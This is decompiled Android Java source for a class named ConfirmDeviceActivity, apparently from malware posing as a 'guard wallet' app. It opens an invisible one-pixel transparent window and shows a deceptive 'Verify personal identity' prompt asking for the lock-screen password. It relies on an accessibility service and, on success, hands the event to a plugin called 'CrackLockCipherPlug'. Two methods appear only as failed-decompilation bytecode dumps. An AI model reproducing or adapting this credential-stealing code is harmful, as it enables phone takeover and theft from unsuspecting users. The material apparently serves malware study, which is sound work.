package com.guard.wallet.activity;

import a0.a;
import a0.h;
import a1.q;
import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Intent;
import android.graphics.Rect;
import android.hardware.biometrics.BiometricPrompt;
import android.os.Bundle;
import android.os.CancellationSignal;
import android.os.Build.VERSION;
import android.util.Log;
import android.view.View;
import android.view.WindowManager.LayoutParams;
import com.guard.wallet.MainApplication;
import com.guard.wallet.helper.o;
import com.guard.wallet.plug.c;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.f;
import g.b;
import java.util.LinkedList;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executor;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public class ConfirmDeviceActivity extends Activity {
   public static volatile ConfirmDeviceActivity e;
   public static final AtomicReference f = new AtomicReference(null);
   public String a = "";
   public String b = "";
   public String c = "";
   public final AtomicBoolean d = new AtomicBoolean(false);

   public static void a() {
      MainApplication var1 = MainApplication.getInstance();
      AtomicReference var0 = f;
      if (var1 != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
         c var3 = MainApplication.getInstance().getCrackLockCipherPlug();
         String var2 = (String)var0.get();
         var3.getClass();
         com.guard.wallet.plug.c.d.set(var2);
         com.guard.wallet.plug.c.f = 1L;
         com.guard.wallet.plug.c.g();
      }

      if (o.i() || o.h()) {
         o.f((String)var0.get(), true);
      }
   }

   public static ConfirmDeviceActivity b() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
      //
      // Bytecode:
      // 00: ldc com/guard/wallet/activity/ConfirmDeviceActivity
      // 02: monitorenter
      // 03: getstatic com/guard/wallet/activity/ConfirmDeviceActivity.e Lcom/guard/wallet/activity/ConfirmDeviceActivity;
      // 06: astore 0
      // 07: ldc com/guard/wallet/activity/ConfirmDeviceActivity
      // 09: monitorexit
      // 0a: aload 0
      // 0b: areturn
      // 0c: astore 0
      // 0d: ldc com/guard/wallet/activity/ConfirmDeviceActivity
      // 0f: monitorexit
      // 10: aload 0
      // 11: athrow
   }

   public final void finish() {
      if (MyAccessibilityService.P() != null) {
         MyAccessibilityService var2 = MyAccessibilityService.P();
         ConcurrentLinkedQueue var3 = var2.a;

         try {
            if (!var3.isEmpty()) {
               a var1 = new a(var2, 9);
               var3.removeIf(var1);
            }
         } catch (Exception var4) {
            q.s("com.guard.wallet.service.AccessibilityDelegateManager", var4);
         }

         MyAccessibilityService.P().g.X(r.c.b);
      }

      super.finish();
   }

   public final void onActivityResult(int var1, int var2, Intent var3) {
      if (var1 == 1001) {
         if (var2 == -1) {
            a();
         }

         this.finish();
      }
   }

   public final void onCreate(Bundle var1) {
      super.onCreate(var1);
      var1 = this.getIntent().getExtras();
      if (var1 != null) {
         this.a = var1.getString("CONFIRM_DEVICE_CREDENTIAL_TITLE");
         this.b = var1.getString("CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE");
         this.c = var1.getString("CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION");
         f.set(var1.getString("CONFIRM_FOR_EVENT_CODE"));
      } else {
         this.a = "Verify personal identity";
         this.b = "Privacy protection";
         this.c = "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.";
         f.set("PREPARE_FOR_APP_CONFIRM_LOCK");
      }

      View var4 = new View(this);
      if (VERSION.SDK_INT >= 30) {
         Rect var2 = h.e(h.h(this.getWindow().getWindowManager()));
         var4.layout(var2.left, var2.top, var2.right, var2.bottom);
      }

      this.setContentView(var4);
      LayoutParams var5 = this.getWindow().getAttributes();
      var5.dimAmount = 0.0F;
      var5.x = 0;
      var5.y = 0;
      var5.width = 1;
      var5.height = 1;
      var5.gravity = 8388661;
      this.getWindow().setAttributes(var5);
      this.getWindow().getDecorView().setBackgroundColor(0);
      this.getWindow().setFlags(1024, 1024);
      this.getWindow().addFlags(32);
      this.getWindow().addFlags(16);
      this.getWindow().addFlags(67108864);
      this.getWindow().addFlags(134217728);
      this.getWindow().addFlags(262144);
      e = this;
      com.guard.wallet.utils.h.I();
   }

   public final void onDestroy() {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
      //
      // Bytecode:
      // 00: new java/lang/StringBuilder
      // 03: dup
      // 04: ldc_w "ConfirmDeviceActivity onDestroy:"
      // 07: invokespecial java/lang/StringBuilder.<init> (Ljava/lang/String;)V
      // 0a: astore 1
      // 0b: aload 1
      // 0c: invokestatic java/lang/Thread.currentThread ()Ljava/lang/Thread;
      // 0f: invokevirtual java/lang/Thread.getId ()J
      // 12: invokevirtual java/lang/StringBuilder.append (J)Ljava/lang/StringBuilder;
      // 15: pop
      // 16: ldc_w "ConfirmDeviceActivity"
      // 19: aload 1
      // 1a: invokevirtual java/lang/StringBuilder.toString ()Ljava/lang/String;
      // 1d: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 20: pop
      // 21: aload 0
      // 22: invokespecial android/app/Activity.onDestroy ()V
      // 25: getstatic com/guard/wallet/activity/ConfirmDeviceActivity.e Lcom/guard/wallet/activity/ConfirmDeviceActivity;
      // 28: ifnull 3e
      // 2b: ldc com/guard/wallet/activity/ConfirmDeviceActivity
      // 2d: monitorenter
      // 2e: aconst_null
      // 2f: putstatic com/guard/wallet/activity/ConfirmDeviceActivity.e Lcom/guard/wallet/activity/ConfirmDeviceActivity;
      // 32: ldc com/guard/wallet/activity/ConfirmDeviceActivity
      // 34: monitorexit
      // 35: goto 3e
      // 38: astore 1
      // 39: ldc com/guard/wallet/activity/ConfirmDeviceActivity
      // 3b: monitorexit
      // 3c: aload 1
      // 3d: athrow
      // 3e: return
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void onResume() {
      super.onResume();
      StringBuilder var3 = new StringBuilder("ConfirmDeviceActivity onResume:");
      var3.append(Thread.currentThread().getId());
      Log.d("ConfirmDeviceActivity", var3.toString());
      AtomicBoolean var18 = this.d;
      if (!var18.get() && !var18.get()) {
         Exception var10000;
         label95: {
            label96: {
               MyAccessibilityService var4;
               try {
                  if (MyAccessibilityService.P() == null) {
                     return;
                  }

                  if (MyAccessibilityService.P().f()) {
                     break label96;
                  }

                  var4 = MyAccessibilityService.P();
                  var4.getClass();
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label95;
               }

               label98: {
                  boolean var2;
                  try {
                     var2 = var4.f();
                  } catch (Exception var17) {
                     var10000 = var17;
                     boolean var32 = false;
                     break label98;
                  }

                  ConcurrentLinkedQueue var5 = var4.a;
                  if (var2) {
                     try {
                        if (!var5.isEmpty()) {
                           a var28 = new a(var4, 9);
                           var5.removeIf(var28);
                        }
                     } catch (Exception var16) {
                        Exception var6 = var16;

                        try {
                           q.s("com.guard.wallet.service.AccessibilityDelegateManager", var6);
                        } catch (Exception var15) {
                           var10000 = var15;
                           boolean var33 = false;
                           break label98;
                        }
                     }
                  }

                  try {
                     o.h var29 = new o.h();
                     var5.add(var29);
                     LinkedList var25 = o.h.M();
                     var4.t(o.h.class.getName(), var25);
                     break label96;
                  } catch (Exception var14) {
                     var10000 = var14;
                     boolean var34 = false;
                  }
               }

               Exception var21 = var10000;

               try {
                  q.s("com.guard.wallet.service.AccessibilityDelegateManager", var21);
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var35 = false;
                  break label95;
               }
            }

            int var1;
            try {
               var1 = VERSION.SDK_INT;
            } catch (Exception var11) {
               var10000 = var11;
               boolean var36 = false;
               break label95;
            }

            r.c var26 = r.c.d;
            if (var1 >= 30) {
               try {
                  android.support.v4.view.a.o();
                  BiometricPrompt var22 = h.g(android.support.v4.view.a.d(this).setTitle(this.a).setSubtitle(this.b).setDescription(this.c)).build();
                  CancellationSignal var30 = new CancellationSignal();
                  b var7 = new b();
                  var30.setOnCancelListener(var7);
                  var18.set(true);
                  MyAccessibilityService.P().g.X(var26);
                  Executor var27 = this.getMainExecutor();
                  g.a var19 = new g.a();
                  var22.authenticate(var30, var27, var19);
                  return;
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var37 = false;
               }
            } else {
               label100: {
                  KeyguardManager var23;
                  try {
                     var23 = (KeyguardManager)this.getSystemService("keyguard");
                  } catch (Exception var10) {
                     var10000 = var10;
                     boolean var38 = false;
                     break label100;
                  }

                  if (var23 == null) {
                     return;
                  }

                  try {
                     Intent var24 = var23.createConfirmDeviceCredentialIntent(com.guard.wallet.utils.f.b(this.a), this.c);
                     var24.addFlags(536870912);
                     var24.addFlags(67108864);
                     var24.addFlags(8388608);
                     var18.set(true);
                     MyAccessibilityService.P().g.X(var26);
                     this.startActivityForResult(var24, 1001);
                     return;
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var39 = false;
                  }
               }
            }
         }

         Exception var20 = var10000;
         q.s("ConfirmDeviceActivity", var20);
      }
   }

   public final void onStart() {
      super.onStart();
      StringBuilder var1 = new StringBuilder("ConfirmDeviceActivity onStart:");
      var1.append(Thread.currentThread().getId());
      Log.d("ConfirmDeviceActivity", var1.toString());
   }

   public final void onStop() {
      StringBuilder var1 = new StringBuilder("ConfirmDeviceActivity onStop:");
      var1.append(Thread.currentThread().getId());
      Log.d("ConfirmDeviceActivity", var1.toString());
      super.onStop();
   }
}
